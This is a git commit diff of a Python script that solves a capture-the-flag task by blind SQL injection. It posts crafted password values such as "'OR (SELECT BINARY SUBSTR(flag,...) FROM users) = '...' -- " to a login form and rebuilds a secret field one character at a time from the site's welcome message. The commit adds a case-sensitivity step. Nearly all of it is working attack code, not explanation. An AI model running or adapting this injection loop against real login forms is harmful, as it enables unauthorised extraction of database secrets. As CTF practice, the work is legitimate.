eba3575db4839dc018c33b6ca7e6fef5ec4bb461
abstruso <01158897@pw.edu.pl>
2021-03-09 16:19:07 +0100

    small optimalisation

--- enumeration-1.py
+++ enumeration-1.py
@@ -17,26 +17,40 @@ def progress(character):
 
 
 flag = ""
-character = 20
+character = 32
 position = 1
 print('working...')
 while character != 127:
     try:
         r = requests.post("http://tasks.ctfd.krzysh.pl:7003/", data={
-                          'name': 'Robert', 'pass': "'OR (SELECT BINARY SUBSTR(flag," + str(position) + ",1) FROM users) = '" + chr(character) + "' -- "})
+                          'name': 'Robert', 'pass': "'OR (SELECT SUBSTR(flag," + str(position) + ",1) FROM users) = '" + chr(character) + "' -- "})
     except requests.exceptions.ConnectionError as e:
-        print('\n'+fg.red + '[-] ' + fg.rs +'Connection error has occured\n')
+        print('\n' + fg.red + '[-] ' + fg.rs +
+              'Connection error has occured\n')
         raise
-    # BINARY is necessary for case sensitivity
     # comment (--) is necessary to ignore closing " on server side
     if "Witaj, użytkowniku!" in r.text:
-        # new character is found
-        flag += chr(character)
-        sys.stdout.write('\033[2K\033[1G')
-        print(fg.green + '[+] ' + fg.rs +
-              'new character on position ' + str(position) + ": " + flag)
-        position += 1
-        character = 20
+        # new character is found only case is not clear
+        r = requests.post("http://tasks.ctfd.krzysh.pl:7003/", data={
+                          'name': 'Robert', 'pass': "'OR (SELECT BINARY SUBSTR(flag," + str(position) + ",1) FROM users) = '" + chr(character) + "' -- "})
+        # BINARY is necessary for case sensitivity
+        if "Witaj, użytkowniku!" in r.text:
+            flag += chr(character)
+            sys.stdout.write('\033[2K\033[1G')
+            print(fg.green + '[+] ' + fg.rs +
+                  'new character on position ' + str(position) + ": " + flag)
+            position += 1
+            character = 32
+        else:
+            r = requests.post("http://tasks.ctfd.krzysh.pl:7003/", data={
+                              'name': 'Robert', 'pass': "'OR (SELECT BINARY SUBSTR(flag," + str(position) + ",1) FROM users) = '" + chr(character + 32) + "' -- "})
+            if "Witaj, użytkowniku!" in r.text:
+                flag += chr(character + 32)
+                sys.stdout.write('\033[2K\033[1G')
+                print(fg.green + '[+] ' + fg.rs +
+                      'new character on position ' + str(position) + ": " + flag)
+                position += 1
+                character = 32
     else:
         character += 1
         # these are forbidden characters in this task
